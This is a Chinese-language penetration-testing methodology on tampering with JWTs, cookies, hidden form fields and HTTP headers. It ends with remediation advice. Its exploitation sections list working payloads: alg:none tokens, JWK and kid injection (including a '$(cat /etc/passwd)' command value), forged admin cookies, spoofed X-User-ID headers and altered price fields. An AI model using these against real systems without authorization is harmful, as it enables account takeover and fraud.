# 令牌与元数据篡改攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的令牌（Token）和元数据（Metadata）篡改攻击检测与利用流程，帮助发现因客户端认证信息验证不当导致的权限提升和访问控制绕过漏洞。

## 1.2 适用范围

本文档适用于所有使用客户端令牌进行认证授权的系统，特别是：
- JWT（JSON Web Token）认证系统
- Cookie -based 会话管理
- 自定义认证令牌
- 隐藏表单字段存储权限信息
- HTTP 头传递认证信息

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

令牌与元数据篡改攻击是指攻击者通过修改客户端存储或传输的认证令牌、Cookie、HTTP 头、隐藏表单字段等，绕过访问控制检查或提升权限。

**本质问题**：
- 令牌签名验证缺失或被禁用
- 敏感信息存储在客户端且未加密
- 服务端盲目信任客户端提供的元数据
- 令牌算法可被降级或篡改

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-287 | 身份验证不当 |
| CWE-346 | 来源验证不当 |
| CWE-347 | 令牌验证不当 |
| CWE-639 | 参数化访问控制不当 |
| CWE-285 | 不当授权 |

### 攻击类型分类

| 类型 | 描述 | 常见目标 |
|-----|------|---------|
| JWT 篡改 | 修改 JWT payload 或签名 | 权限提升、用户冒充 |
| Cookie 篡改 | 修改 Cookie 中的权限值 | 会话劫持、权限提升 |
| 令牌重放 | 重复使用已捕获的令牌 | 未授权访问 |
| 算法降级 | 强制使用弱算法或无算法 | 绕过签名验证 |
| 隐藏字段篡改 | 修改表单隐藏字段 | 权限绕过 |
| HTTP 头注入 | 注入自定义认证头 | 身份冒充 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| JWT 认证 | API 认证 | 签名验证缺失 |
| 会话管理 | 用户登录 | Cookie 未签名 |
| 权限控制 | 角色管理 | 角色信息存储在客户端 |
| 表单提交 | 支付/订单 | 价格/数量存储在隐藏字段 |
| API 调用 | 移动应用 | 自定义头未验证 |
| SSO 单点登录 | 多系统集成 | 令牌传递未验证 |

## 2.3 漏洞探测方法

### 2.3.1 JWT 令牌探测

**识别 JWT 令牌**：
```
JWT 通常在以下位置：
- Authorization: Bearer <token>
- Cookie: jwt=<token>
- 响应体中的 token 字段
- localStorage/sessionStorage
```

**JWT 结构分析**：
```bash
# JWT 格式：header.payload.signature
# 使用 base64 解码查看内容

# 解码 header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# 解码 payload
echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ" | base64 -d
# {"sub":"1234567890","name":"John Doe","iat":1516239022}
```

**在线工具**：
```
- https://jwt.io/
- https://jwt.ms/
```

### 2.3.2 Cookie 探测

**识别敏感 Cookie**：
```bash
# 检查 Cookie 内容
Set-Cookie: user=admin; path=/
Set-Cookie: role=user; path=/
Set-Cookie: is_premium=false; path=/
Set-Cookie: permissions=read,write; path=/

# 检查 Cookie 属性
# - HttpOnly: 防止 XSS 窃取
# - Secure: 仅 HTTPS 传输
# - SameSite: 防止 CSRF
```

**Cookie 编码分析**：
```bash
# 检查是否使用编码
# URL 编码、Base64、Hex 等

# 尝试解码
echo "YWRtaW4=" | base64 -d  # admin
```

### 2.3.3 隐藏表单字段探测

**识别隐藏字段**：
```html
<!-- 查看页面源码 -->
<input type="hidden" name="user_id" value="123">
<input type="hidden" name="role" value="user">
<input type="hidden" name="price" value="100">
<input type="hidden" name="is_admin" value="0">
```

### 2.3.4 HTTP 头探测

**识别自定义认证头**：
```bash
# 常见认证头
X-User-ID: 123
X-User-Role: user
X-Access-Token: xxx
X-API-Key: xxx
Authorization: Bearer xxx
```

## 2.4 漏洞利用方法

### 2.4.1 JWT 篡改攻击

**攻击 1：移除签名（alg: none）**：
```bash
# 1. 修改 header 中的 alg 为 none
{"alg":"none","typ":"JWT"}

# 2. 修改 payload 提升权限
{"sub":"123","role":"admin"}

# 3. 移除 signature 部分
# 最终 JWT: base64(header).base64(payload).

# 4. 发送请求
curl -H "Authorization: Bearer <modified_jwt>" https://target.com/api/admin
```

**攻击 2：算法混淆（HS256 vs RS256）**：
```bash
# 如果服务器使用 RS256（非对称加密）
# 攻击者可以用公钥作为 HS256 的密钥

# 步骤：
# 1. 获取服务器公钥（通常在 JWKS 端点）
# 2. 使用公钥作为 HS256 密钥签名恶意 JWT
# 3. 服务器可能用公钥验证 HS256 签名
```

**攻击 3：密钥爆破**：
```bash
# 使用常见密钥爆破 HS256 签名
# 工具：jwt-crack, hashcat

# 常见弱密钥：
# - secret
# - password
# - key
# - jwt_secret
# - 应用名称
```

**攻击 4：JWK 注入**：
```bash
# 如果服务器支持 JWK（JSON Web Key）
# 可以在 header 中注入自己的公钥

# Header:
{
    "alg": "RS256",
    "typ": "JWT",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "n": "<your_public_key>"
    }
}

# 然后用对应的私钥签名
```

**攻击 5：kid 参数注入**：
```bash
# kid (Key ID) 用于标识密钥
# 如果 kid 来自用户输入，可能注入

# SQL 注入示例
"kid": "' OR '1'='1"

# 命令注入示例
"kid": "$(cat /etc/passwd)"

# 路径遍历示例
"kid": "../../../dev/null"
```

### 2.4.2 Cookie 篡改攻击

**攻击 1：直接修改权限值**：
```bash
# 原始 Cookie
Cookie: role=user; is_admin=0

# 修改后
Cookie: role=admin; is_admin=1

# 或者 Base64 编码
Cookie: role=dXNlcg==  →  dXNlcg== 解码为 user
Cookie: role=YWRtaW4=  →  YWRtaW4= 解码为 admin
```

**攻击 2：序列化对象注入**：
```bash
# PHP 序列化
Cookie: user=YTo0OntzOjQ6InJvbGUiO3M6NDoiYWRtaW4iO30=
# 解码后：a:4:{s:4:"role";s:4:"admin";}

# Python Pickle（较少见）
# 可能包含恶意序列化数据
```

**攻击 3：Cookie 拼接绕过**：
```bash
# 某些服务器处理多个同名 Cookie 的方式不同
# 可能只使用第一个或最后一个

# 发送多个 Cookie
Cookie: role=user
Cookie: role=admin

# 或者使用数组语法
Cookie: role[]=user&role[]=admin
```

### 2.4.3 隐藏表单字段篡改

**攻击 1：修改权限字段**：
```bash
# 原始表单
<input type="hidden" name="is_premium" value="false">
<input type="hidden" name="role" value="user">

# 修改后
<input type="hidden" name="is_premium" value="true">
<input type="hidden" name="role" value="admin">
```

**攻击 2：修改价格/数量**：
```bash
# 原始表单
<input type="hidden" name="price" value="100">
<input type="hidden" name="quantity" value="1">

# 修改后
<input type="hidden" name="price" value="0.01">
<input type="hidden" name="quantity" value="999">
```

**攻击 3：添加缺失字段**：
```bash
# 原始表单没有某些字段
# 攻击者添加这些字段

<input type="hidden" name="is_admin" value="1">
<input type="hidden" name="bypass_verification" value="true">
```

### 2.4.4 HTTP 头注入攻击

**攻击 1：X-User-ID 注入**：
```bash
# 添加自定义头冒充其他用户
X-User-ID: 1  # 管理员 ID

# 或者
X-Forwarded-User: admin
X-Rewrite-URL: /admin
```

**攻击 2：X-Forwarded-For 注入**：
```bash
# 伪装成内部 IP
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 192.168.1.1

# 可能绕过 IP 白名单
```

**攻击 3：多值头注入**：
```bash
# 发送多个同名头
X-User-Role: user
X-User-Role: admin

# 或者使用逗号分隔
X-User-Role: user, admin
```

### 2.4.5 令牌重放攻击

**攻击 1：捕获并重放令牌**：
```bash
# 1. 捕获合法用户的令牌
# 2. 在另一个请求中重放

curl -H "Authorization: Bearer <captured_token>" \
     https://target.com/api/sensitive-data
```

**攻击 2：令牌劫持**：
```bash
# 如果令牌通过不安全的渠道传输
# 如 URL 参数、Referer 头等

# 从日志、浏览器历史等获取令牌
# 然后重放使用
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过 JWT 验证

**时间戳绕过**：
```bash
# 修改 exp (过期时间)
{"exp": 9999999999}

# 修改 nbf (not before)
{"nbf": 0}

# 修改 iat (issued at)
{"iat": 0}
```

**大小写绕过**：
```bash
# 某些库对算法名大小写不敏感
{"alg": "None"}  # 可能绕过 "none" 检查
{"alg": "NONE"}
```

**密钥混淆绕过**：
```bash
# 尝试常见密钥
secrets = ['secret', 'password', 'key', 'jwt_secret', 
           'your-256-bit-secret', 'your-secret-key']
```

### 2.5.2 绕过 Cookie 验证

**编码绕过**：
```bash
# 如果服务器检查原始值
# 尝试不同编码

# Base64
role=YWRtaW4=  # admin

# URL 编码
role=%61%64%6D%69%6E

# Hex
role=61646d696e
```

**分割绕过**：
```bash
# 如果服务器检查完整 Cookie
# 尝试分割成多个部分

Cookie: role=ad; Cookie: role=min
# 服务器可能拼接为 admin
```

### 2.5.3 绕过 HTTP 头验证

**头大小写绕过**：
```bash
# HTTP 头不区分大小写
X-User-ID: 1
x-user-id: 1
X-USER-ID: 1
```

**头前缀绕过**：
```bash
# 尝试不同前缀
X-User-ID: 1
X-Forwarded-User: 1
X-Rewrite-User: 1
X-Original-User: 1
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 测试类型 | Payload | 说明 |
|---------|--------|------|
| JWT 无算法 | `{"alg":"none","typ":"JWT"}` | 移除签名验证 |
| JWT 算法混淆 | `{"alg":"HS256"}` + RS256 公钥 | 算法混淆攻击 |
| JWT JWK 注入 | `{"jwk":{...}}` in header | 注入自定义密钥 |
| JWT kid 注入 | `{"kid":"../../../dev/null"}` | 路径遍历 |
| Cookie 权限修改 | `role=admin; is_admin=1` | 直接修改权限 |
| Cookie Base64 | `role=YWRtaW4=` | Base64 编码 admin |
| X-User-ID | `X-User-ID: 1` | 冒充管理员 |
| X-Forwarded-For | `X-Forwarded-For: 127.0.0.1` | 伪装本地 IP |
| 隐藏字段 | `is_premium=true` | 修改隐藏字段 |

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| jwt.io | JWT 在线解码/编辑 | https://jwt.io/ |
| jwt-crack | JWT 密钥爆破 | https://github.com/brendan-rius/c-jwt-cracker |
| Hashcat | JWT 破解 | https://hashcat.net/hashcat/ |
| Burp Suite | 请求篡改 | https://portswigger.net/burp |
| JWT Editor | Burp 插件 | Burp BApp Store |

## 3.3 修复建议

### JWT 安全配置

1. **始终验证签名**
   - 不要接受 alg: none
   - 明确指定期望的算法

2. **使用强密钥**
   - HS256 至少使用 256 位密钥
   - 定期轮换密钥

3. **验证所有声明**
   - exp (过期时间)
   - nbf (生效时间)
   - iss (签发者)
   - aud (受众)

4. **使用标准库**
   - 避免自己实现 JWT 验证

### Cookie 安全配置

1. **签名 Cookie**
   - 使用 HMAC 签名
   - 不要信任未签名的 Cookie

2. **设置安全属性**
   - HttpOnly
   - Secure
   - SameSite=Strict

3. **敏感信息不存 Cookie**
   - 只存储会话 ID
   - 权限信息存储在服务端

### HTTP 头安全

1. **不要信任客户端头**
   - 所有认证头都应服务端验证
   - 使用内部头传递身份信息

2. **配置代理清理头**
   - 反向代理应移除外部 X-Forwarded-* 头

---

**参考资源**：
- [OWASP JWT Security](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)
- [jwt.io - Introduction](https://jwt.io/introduction)
- [CWE-347: Token Verification](https://cwe.mitre.org/data/definitions/347.html)
